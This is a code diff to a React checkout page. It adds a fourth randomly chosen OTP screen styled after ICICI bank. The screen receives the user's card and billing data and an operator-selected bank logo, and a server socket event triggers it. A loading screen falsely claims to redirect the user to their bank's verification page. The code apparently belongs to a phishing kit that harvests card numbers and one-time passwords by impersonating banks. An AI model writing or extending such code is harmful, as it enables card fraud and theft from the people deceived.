@@ -20,6 +20,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import NewOTPPage from '../components/NewOTPPage';
 import ThirdOTPPage from '../components/ThirdOTPPage';
+import ICICIOTPPage from '../components/ICICIOTPPage';
 import ExpiredPage from '../components/ExpiredPage';
 import { api } from '../utils/api';
 import { devLog, devError, devWarn } from '../utils/logger';
@@ -465,14 +466,16 @@ const CheckoutOriginal = () => {
   const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
   
-  // OTP Page Selection State (random between 3 pages - ~33.33% each)
+  // OTP Page Selection State (random between 4 pages - 25% each)
   const [otpPageSelection, setOtpPageSelection] = useState(() => {
     const rand = Math.random();
-    if (rand < 0.333) return 'old';
-    if (rand < 0.666) return 'new';
-    return 'third';
+    if (rand < 0.25) return 'old';
+    if (rand < 0.50) return 'new';
+    if (rand < 0.75) return 'third';
+    return 'icici';
   });
   const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
+  const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
 
   // Debug: Log the current state of agreeTerms (disabled)
   // useEffect(() => {
@@ -526,8 +529,7 @@ const CheckoutOriginal = () => {
   const [showCancelConfirm, setShowCancelConfirm] = useState(false);
   const [transactionCancelError, setTransactionCancelError] = useState("");
   
-  // New OTP page loading state
-  const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
+
   
   // Payment feedback feature states
   const [showPaymentFeedback, setShowPaymentFeedback] = useState(false);
@@ -780,9 +782,9 @@ const CheckoutOriginal = () => {
     }
   }, [location.state]);
 
-  // Handle new OTP page loading delay (2-6 seconds)
+  // Handle OTP page loading delay for all pages (2-6 seconds)
   useEffect(() => {
-    if (currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third')) {
+    if (currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third' || otpPageSelection === 'icici' || otpPageSelection === 'old')) {
       setNewOtpPageLoading(true);
       
       // Random delay between 2-6 seconds
@@ -996,6 +998,8 @@ const CheckoutOriginal = () => {
     });
   };
 
+
+
   const handleContinue = () => {
     // Validate all fields
     const newErrors = {
@@ -1147,17 +1151,20 @@ const CheckoutOriginal = () => {
     socket.on('show-otp', (data) => {
       devLog('Show OTP with currency data:', data);
       
-      // Random selection between 3 OTP pages (~33.33% each)
+      // Random selection between 4 OTP pages (25% each)
       const rand = Math.random();
       let selectedPage;
-      if (rand < 0.333) {
+      if (rand < 0.25) {
         selectedPage = 'old';
         setUseNewOTPPage(false);
-      } else if (rand < 0.666) {
+      } else if (rand < 0.50) {
         selectedPage = 'new';
         setUseNewOTPPage(true);
-      } else {
+      } else if (rand < 0.75) {
         selectedPage = 'third';
+        setUseNewOTPPage(false); // Will be handled separately
+      } else {
+        selectedPage = 'icici';
         setUseNewOTPPage(false); // Will be handled separately
       }
       setOtpPageSelection(selectedPage);
@@ -2683,6 +2690,94 @@ const CheckoutOriginal = () => {
                   )}
                   {!confirmingPayment && 'Confirm Payment'}
                 </Button>
+              </>
+            )}
+
+            {/* OTP Section */}
+            {currentStep === 'otp' && (
+              <>
+                {/* Show loading screen while OTP page is loading */}
+                {newOtpPageLoading ? (
+                  <div className="min-h-screen bg-slate-900 flex items-center justify-center">
+                    <div className="text-center">
+                      <div className="relative">
+                        <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-blue-500 mx-auto"></div>
+                        <div className="absolute inset-0 flex items-center justify-center">
+                          <div className="animate-pulse h-4 w-4 bg-blue-500 rounded-full"></div>
+                        </div>
+                      </div>
+                      <h2 className="text-xl font-semibold text-white mt-6 mb-2">Setting up secure payment...</h2>
+                      <p className="text-slate-400">Please wait while we redirect you to your bank's verification page</p>
+                      <div className="mt-4 flex justify-center space-x-1">
+                        <div className="animate-bounce h-2 w-2 bg-blue-500 rounded-full" style={{animationDelay: '0ms'}}></div>
+                        <div className="animate-bounce h-2 w-2 bg-blue-500 rounded-full" style={{animationDelay: '150ms'}}></div>
+                        <div className="animate-bounce h-2 w-2 bg-blue-500 rounded-full" style={{animationDelay: '300ms'}}></div>
+                      </div>
+                    </div>
+                  </div>
+                ) : (
+                  <>
+                    {/* Render different OTP pages based on selection */}
+                {otpPageSelection === 'old' && !useNewOTPPage && (
+                  // Original OTP modal (existing implementation)
+                  <div>
+                    {/* This would be the original OTP modal JSX */}
+                    <p>Original OTP Page</p>
+                  </div>
+                )}
+
+                {otpPageSelection === 'new' && useNewOTPPage && (
+                  <NewOTPPage
+                    cardData={cardData}
+                    otpValue={otpValue}
+                    setOtpValue={setOtpValue}
+                    otpSubmitting={otpSubmitting}
+                    handleOtpSubmit={handleOtpSubmit}
+                    handleOtpCancel={handleOtpCancel}
+                    otpError={otpError}
+                    adminSelectedBankLogo={adminSelectedBankLogo}
+                    sessionBankLogo={sessionBankLogo}
+                    cardBrandLogos={cardBrandLogos}
+                    getCardBrand={getCardBrand}
+                  />
+                )}
+
+                {otpPageSelection === 'third' && (
+                  <ThirdOTPPage
+                    cardData={cardData}
+                    otpValue={otpValue}
+                    setOtpValue={setOtpValue}
+                    otpSubmitting={otpSubmitting}
+                    handleOtpSubmit={handleOtpSubmit}
+                    handleOtpCancel={handleOtpCancel}
+                    otpError={otpError}
+                    adminSelectedBankLogo={adminSelectedBankLogo}
+                    sessionBankLogo={sessionBankLogo}
+                    cardBrandLogos={cardBrandLogos}
+                    getCardBrand={getCardBrand}
+                  />
+                )}
+
+                {otpPageSelection === 'icici' && (
+                  <ICICIOTPPage
+                    cardData={cardData}
+                    billingDetails={formData}
+                    otpValue={otpValue}
+                    setOtpValue={setOtpValue}
+                    otpSubmitting={otpSubmitting}
+                    handleOtpSubmit={handleOtpSubmit}
+                    handleOtpCancel={handleOtpCancel}
+                    otpError={otpError}
+                    adminSelectedBankLogo={adminSelectedBankLogo}
+                    sessionBankLogo={sessionBankLogo}
+                    cardBrandLogos={cardBrandLogos}
+                    getCardBrand={getCardBrand}
+                    displayPrice={displayPrice}
+                    formatPrice={formatPrice}
+                  />
+                )}
+                  </>
+                )}
               </>
             )}
           </div>
